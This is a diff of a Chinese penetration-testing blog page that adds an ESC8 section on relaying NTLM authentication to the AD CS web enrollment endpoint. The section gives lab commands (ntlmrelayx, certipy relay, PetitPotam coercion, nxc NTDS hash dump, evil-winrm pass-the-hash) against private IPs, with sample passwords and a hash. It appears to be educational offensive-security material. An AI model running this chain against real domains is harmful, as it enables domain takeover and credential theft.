@@ -45,8 +45,11 @@
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-13.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-14.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-16.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-17.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-18.png">
 <meta property="article:published_time" content="2026-05-23T10:00:00.000Z">
-<meta property="article:modified_time" content="2026-06-01T12:42:44.459Z">
+<meta property="article:modified_time" content="2026-07-20T15:28:10.594Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="域">
@@ -94,7 +97,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"openkounter":{"server_url":"https://v.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e509bf56906f797e00a96ebece6ea445","google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"openkounter":{"server_url":"https://v.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -105,6 +108,19 @@
   <script  src="/js/color-schema.js" ></script>
   
 
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e509bf56906f797e00a96ebece6ea445";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
   
 
   
@@ -436,7 +452,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.5k 字
+          6.1k 字
         
       </span>
     
@@ -447,7 +463,7 @@
         
         
         
-          34 分钟
+          46 分钟
         
       </span>
     
@@ -580,9 +596,27 @@
 <h1 id="未签名端点"><a href="#未签名端点" class="headerlink" title="未签名端点"></a>未签名端点</h1><blockquote>
 <p>ESC8, ESC11</p>
 </blockquote>
+<h2 id="ESC8-NTLM-Relay-到-HTTP-端点"><a href="#ESC8-NTLM-Relay-到-HTTP-端点" class="headerlink" title="ESC8-NTLM Relay 到 HTTP 端点"></a>ESC8-NTLM Relay 到 HTTP 端点</h2><blockquote>
+<p>把受害者真实的 NTLM 身份验证转发给证书注册网站，让 CA 误以为受害者本人正在申请证书；攻击者则拿到该证书及其私钥，之后可以持续以受害者身份认证。</p>
+</blockquote>
+<p>ESC8 是 Active Directory 证书服务 (AD CS) 中的一个配置错误，其根源在于 Web 注册服务保护不足。具体来说，如果 Web 注册服务使用 HTTP，或虽然使用 HTTPS，但未强制 Extended Protection for Authentication（EPA，也就是 Channel Binding），则域网络中的 NTLM 身份验证尝试可能会被转发到该 Web 注册服务，从而为其他域主体请求证书</p>
+<p><strong>探测识别</strong></p>
+<p>域控 aa.xxx.com    192.168.100.126<br>辅助域控+ADCS   192.168.100.191<br>域内主机        192.168.100.190<br>kali           192.168.100.186</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Certify.exe enum-cas --filter-vulnerable --hide-admins<br>certipy-ad find -u qq@xxx.com -p Qwer123 -dc-ip 192.168.100.191 -vulnerable -stdout<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-16.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>利用</strong></p>
+<p>ntlmrelayx</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.监听进入的 NTLM 认证并尝试转发</span><br>impacket-ntlmrelayx -t http://192.168.100.191/certsrv/certfnsh.asp -smb2support --adcs --template <span class="hljs-string">&#x27;DomainController&#x27;</span><br><br><br><span class="hljs-comment"># 2.利用 PetitPotam 强制 192.168.100.126 向 192.168.100.186 发起 NTLM 身份验证 [监听ip、目标服务ip]</span><br>python PetitPotam.py 192.168.100.186 192.168.100.126<br><br><br><span class="hljs-comment"># 3.使用为 AA 颁发的证书提取管理员帐户的 NTLM hash</span><br>nxc smb 192.168.100.126 --pfx-cert AA.pfx -u <span class="hljs-string">&quot;AA$&quot;</span><br>nxc smb 192.168.100.126 --pfx-cert AA.pfx -u <span class="hljs-string">&quot;AA$&quot;</span> --ntds --user Administrator<br><br><br><span class="hljs-comment"># 4.利用 Evil-Winrm 进行横向移动和权限升级</span><br>evil-winrm -i 192.168.100.126 -u administrator -H 91ff0fb948167eb4d080b5330686c02f<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-17.png" srcset="/img/loading.gif" lazyload></p>
+<p>certipy-ad</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.启动 Certipy NTLM 中继(如果需要转发域控制器帐户，通常需要指定DomainController模板。转发用户帐户可以省略)</span><br>certipy-ad relay -target <span class="hljs-string">&#x27;http://192.168.100.191&#x27;</span> -template <span class="hljs-string">&#x27;DomainController&#x27;</span><br><br><br><span class="hljs-comment"># 2.强制目标尝试对 Certipy 中继监听的攻击者机器进行 NTLM 身份验证</span><br>python PetitPotam.py -u qq -p Qwer123 192.168.100.186 192.168.100.126<br><br><br><span class="hljs-comment"># 3.Certipy 转发身份验证并请求证书</span><br><span class="hljs-comment"># 会将其保存为 .pfx 文件</span><br><br><br><span class="hljs-comment"># 4.使用获取的证书进行身份验证。使用 .pfx 通过中继获取的文件进行身份验证</span><br>certipy-ad auth -pfx <span class="hljs-string">&#x27;aa.pfx&#x27;</span> -dc-ip <span class="hljs-string">&#x27;192.168.100.126&#x27;</span><br><br><br><span class="hljs-comment"># 5.交互式 LDAP Shell</span><br>certipy-ad auth -pfx aa.pfx -dc-ip 192.168.100.126 -ldap-shell<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-18.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h1><hr>
 <p>参考文章</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/129353293">ADCS攻击之证书模板配置错误 ESC1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44001905/article/details/145833252">ADCS-ESC1漏洞环境构造与利用</a><br><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques">4 ‐ Escalation Techniques</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/17608068.html">ADCS ESC 1-3 攻击链路</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/129353293">ADCS攻击之证书模板配置错误 ESC1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44001905/article/details/145833252">ADCS-ESC1漏洞环境构造与利用</a><br><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques">4 ‐ Escalation Techniques</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/17608068.html">ADCS ESC 1-3 攻击链路</a><br><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/">ADCS ESC8 – NTLM Relay to AD CS HTTP Endpoints</a></p>
 
                 
               </div>
@@ -651,7 +685,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年6月1日</div>
+          <div>2026年7月20日</div>
         </div>
       
       
